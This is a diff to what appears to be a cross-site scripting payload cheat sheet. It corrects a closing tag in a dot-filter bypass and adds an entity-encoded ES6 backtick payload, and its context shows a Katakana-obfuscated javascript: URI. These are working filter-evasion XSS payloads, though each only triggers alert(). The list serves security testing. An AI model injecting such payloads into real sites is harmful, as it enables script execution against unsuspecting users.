@@ -465,7 +465,7 @@ You can bypass a single quote with &#39; in an on mousedown event handler
 Bypass dot filter
 
 ```javascript
-<script>window['alert'](document['domain'])<script>
+<script>window['alert'](document['domain'])</script>
 ```
 
 Bypass parenthesis for string - Firefox/Opera
@@ -652,6 +652,12 @@ Bypass using [Katakana](https://github.com/aemkei/katakana.js)
 
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+```
+
+Bypass using ECMAScript6 variation:
+
+```
+<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
 ```
 
 Bypass using Octal encoding
